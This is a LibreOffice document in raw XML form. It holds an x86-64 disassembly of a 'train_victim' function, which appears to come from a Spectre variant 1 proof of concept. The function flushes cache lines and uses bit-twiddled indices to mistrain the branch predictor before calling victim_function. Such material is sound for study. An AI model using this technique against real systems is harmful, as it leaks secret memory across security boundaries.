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a1317" officeooo:paragraph-rsid="000a1317" style:font-size-asian="24pt" style:font-weight-asian="bold" style:font-size-complex="2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t Twiddle</text:p>
      <text:p text:style-name="Standard">0000000000000919 &lt;train_victim&gt;:</text:p>
      <text:p text:style-name="Standard"><text:s/>919:<text:tab/>55 <text:s text:c="18"/><text:tab/><text:tab/>push <text:s text:c="2"/>%rbp</text:p>
      <text:p text:style-name="Standard"><text:s/>91a:<text:tab/>48 89 e5 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%rsp,%rbp</text:p>
      <text:p text:style-name="Standard"><text:s/>91d:<text:tab/>48 83 ec 30 <text:s text:c="9"/><text:tab/>sub <text:s text:c="3"/>$0x30,%rsp</text:p>
      <text:p text:style-name="Standard"><text:s/>921:<text:tab/>89 7d dc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%edi,-0x24(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>924:<text:tab/>48 89 75 d0 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%rsi,-0x30(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>928:<text:tab/>c7 45 ec 00 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x0,-0x14(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>92f:<text:tab/>eb 1a <text:s text:c="15"/><text:tab/>jmp <text:s text:c="3"/>94b &lt;train_victim+0x32&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>931:<text:tab/>8b 45 ec <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x14(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>934:<text:tab/>c1 e0 0c <text:s text:c="12"/><text:tab/>shl <text:s text:c="3"/>$0xc,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>937:<text:tab/>48 63 d0 <text:s text:c="12"/><text:tab/>movslq %eax,%rdx</text:p>
      <text:p text:style-name="Standard"><text:s/>93a:<text:tab/>48 8d 05 ff 07 20 00 <text:tab/>lea <text:s text:c="3"/>0x2007ff(%rip),%rax <text:s text:c="7"/># 201140 &lt;array&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>941:<text:tab/>48 01 d0 <text:s text:c="12"/><text:tab/>add <text:s text:c="3"/>%rdx,%rax</text:p>
      <text:p text:style-name="Standard"><text:s/>944:<text:tab/>0f ae 38 <text:s text:c="12"/><text:tab/>clflush (%rax)</text:p>
      <text:p text:style-name="Standard"><text:s/>947:<text:tab/>83 45 ec 01 <text:s text:c="9"/><text:tab/>addl <text:s text:c="2"/>$0x1,-0x14(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>94b:<text:tab/>81 7d ec ff 00 00 00 <text:tab/>cmpl <text:s text:c="2"/>$0xff,-0x14(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>952:<text:tab/>7e dd <text:s text:c="15"/><text:tab/>jle <text:s text:c="3"/>931 &lt;train_victim+0x18&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>954:<text:tab/>0f ae f0 <text:s text:c="12"/><text:tab/>mfence </text:p>
      <text:p text:style-name="Standard"><text:s/>957:<text:tab/>8b 0d c3 06 20 00 <text:s text:c="3"/><text:tab/>mov <text:s text:c="3"/>0x2006c3(%rip),%ecx <text:s text:c="7"/># 201020 &lt;bufferSize&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>95d:<text:tab/>8b 45 dc <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x24(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>960:<text:tab/>99 <text:s text:c="18"/><text:tab/><text:tab/>cltd <text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard"><text:s/>961:<text:tab/>f7 f9 <text:s text:c="15"/><text:tab/>idiv <text:s text:c="2"/>%ecx</text:p>
      <text:p text:style-name="Standard"><text:s/>963:<text:tab/>89 d0 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%edx,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>965:<text:tab/>48 98 <text:s text:c="15"/><text:tab/>cltq <text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard"><text:s/>967:<text:tab/>48 89 45 f8 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>%rax,-0x8(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>96b:<text:tab/>c7 45 f0 1d 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x1d,-0x10(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>972:<text:tab/>e9 81 00 00 00 <text:s text:c="6"/><text:tab/>jmpq <text:s text:c="2"/>9f8 &lt;train_victim+0xdf&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>977:<text:tab/>48 8d 05 a2 06 20 00 <text:tab/>lea <text:s text:c="3"/>0x2006a2(%rip),%rax <text:s text:c="7"/># 201020 &lt;bufferSize&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>97e:<text:tab/>0f ae 38 <text:s text:c="12"/><text:tab/>clflush (%rax)</text:p>
      <text:p text:style-name="Standard"><text:s/>981:<text:tab/>c7 45 e8 00 00 00 00 <text:tab/>movl <text:s text:c="2"/>$0x0,-0x18(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>988:<text:tab/>eb 09 <text:s text:c="15"/><text:tab/>jmp <text:s text:c="3"/>993 &lt;train_victim+0x7a&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>98a:<text:tab/>8b 45 e8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x18(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>98d:<text:tab/>83 c0 01 <text:s text:c="12"/><text:tab/>add <text:s text:c="3"/>$0x1,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>990:<text:tab/>89 45 e8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0x18(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>993:<text:tab/>8b 45 e8 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x18(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>996:<text:tab/>83 f8 63 <text:s text:c="12"/><text:tab/>cmp <text:s text:c="3"/>$0x63,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>999:<text:tab/>7e ef <text:s text:c="15"/><text:tab/>jle <text:s text:c="3"/>98a &lt;train_victim+0x71&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>99b:<text:tab/>8b 4d f0 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0x10(%rbp),%ecx</text:p>
      <text:p text:style-name="Standard"><text:s/>99e:<text:tab/>ba ab aa aa 2a <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x2aaaaaab,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9a3:<text:tab/>89 c8 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%ecx,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9a5:<text:tab/>f7 ea <text:s text:c="15"/><text:tab/>imul <text:s text:c="2"/>%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9a7:<text:tab/>89 c8 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%ecx,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9a9:<text:tab/>c1 f8 1f <text:s text:c="12"/><text:tab/>sar <text:s text:c="3"/>$0x1f,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9ac:<text:tab/>29 c2 <text:s text:c="15"/><text:tab/>sub <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9ae:<text:tab/>89 d0 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%edx,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9b0:<text:tab/>01 c0 <text:s text:c="15"/><text:tab/>add <text:s text:c="3"/>%eax,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9b2:<text:tab/>01 d0 <text:s text:c="15"/><text:tab/>add <text:s text:c="3"/>%edx,%eax</text:p>
      <text:p text:style-name="Standard"><text:soft-page-break/><text:s/>9b4:<text:tab/>01 c0 <text:s text:c="15"/><text:tab/>add <text:s text:c="3"/>%eax,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9b6:<text:tab/>29 c1 <text:s text:c="15"/><text:tab/>sub <text:s text:c="3"/>%eax,%ecx</text:p>
      <text:p text:style-name="Standard"><text:s/>9b8:<text:tab/>89 ca <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%ecx,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9ba:<text:tab/>8d 42 ff <text:s text:c="12"/><text:tab/>lea <text:s text:c="3"/>-0x1(%rdx),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9bd:<text:tab/>66 b8 00 00 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>$0x0,%ax</text:p>
      <text:p text:style-name="Standard"><text:s/>9c1:<text:tab/>89 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0xc(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>9c4:<text:tab/>8b 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0xc(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9c7:<text:tab/>c1 f8 10 <text:s text:c="12"/><text:tab/>sar <text:s text:c="3"/>$0x10,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9ca:<text:tab/>09 45 f4 <text:s text:c="12"/><text:tab/>or <text:s text:c="4"/>%eax,-0xc(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>9cd:<text:tab/>48 8b 45 d0 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>-0x30(%rbp),%rax</text:p>
      <text:p text:style-name="Standard"><text:s/>9d1:<text:tab/>89 c2 <text:s text:c="15"/><text:tab/>mov <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9d3:<text:tab/>48 8b 45 f8 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>-0x8(%rbp),%rax</text:p>
      <text:p text:style-name="Standard"><text:s/>9d7:<text:tab/>31 c2 <text:s text:c="15"/><text:tab/>xor <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9d9:<text:tab/>8b 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0xc(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9dc:<text:tab/>21 c2 <text:s text:c="15"/><text:tab/>and <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s/>9de:<text:tab/>48 8b 45 f8 <text:s text:c="9"/><text:tab/>mov <text:s text:c="3"/>-0x8(%rbp),%rax</text:p>
      <text:p text:style-name="Standard"><text:s/>9e2:<text:tab/>31 d0 <text:s text:c="15"/><text:tab/>xor <text:s text:c="3"/>%edx,%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9e4:<text:tab/>89 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%eax,-0xc(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>9e7:<text:tab/>8b 45 f4 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>-0xc(%rbp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s/>9ea:<text:tab/>48 98 <text:s text:c="15"/><text:tab/>cltq <text:s text:c="2"/></text:p>
      <text:p text:style-name="Standard"><text:s/>9ec:<text:tab/>48 89 c7 <text:s text:c="12"/><text:tab/>mov <text:s text:c="3"/>%rax,%rdi</text:p>
      <text:p text:style-name="Standard"><text:s/>9ef:<text:tab/>e8 61 00 00 00 <text:s text:c="6"/><text:tab/>callq <text:s/>a55 &lt;victim_function&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>9f4:<text:tab/>83 6d f0 01 <text:s text:c="9"/><text:tab/>subl <text:s text:c="2"/>$0x1,-0x10(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>9f8:<text:tab/>83 7d f0 00 <text:s text:c="9"/><text:tab/>cmpl <text:s text:c="2"/>$0x0,-0x10(%rbp)</text:p>
      <text:p text:style-name="Standard"><text:s/>9fc:<text:tab/>0f 89 75 ff ff ff <text:s text:c="3"/><text:tab/>jns <text:s text:c="3"/>977 &lt;train_victim+0x5e&gt;</text:p>
      <text:p text:style-name="Standard"><text:s/>a02:<text:tab/>90 <text:s text:c="18"/><text:tab/><text:tab/>nop</text:p>
      <text:p text:style-name="Standard"><text:s/>a03:<text:tab/>c9 <text:s text:c="18"/><text:tab/><text:tab/>leaveq </text:p>
      <text:p text:style-name="Standard"><text:s/>a04:<text:tab/>c3 <text:s text:c="18"/><text:tab/><text:tab/>retq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07:58:10.706839223</meta:creation-date>
    <meta:print-date>2019-10-15T07:59:21.755577342</meta:print-date>
    <dc:date>2019-10-15T08:00:46.839164286</dc:date>
    <meta:editing-duration>PT2M37S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="76" meta:word-count="471" meta:character-count="3610" meta:non-whitespace-character-count="2001"/>
    <meta:generator>LibreOffice/6.0.7.3$Linux_X86_64 LibreOffice_project/00m0$Build-3</meta:generator>
  </office:meta>
</office:document-meta>
</file>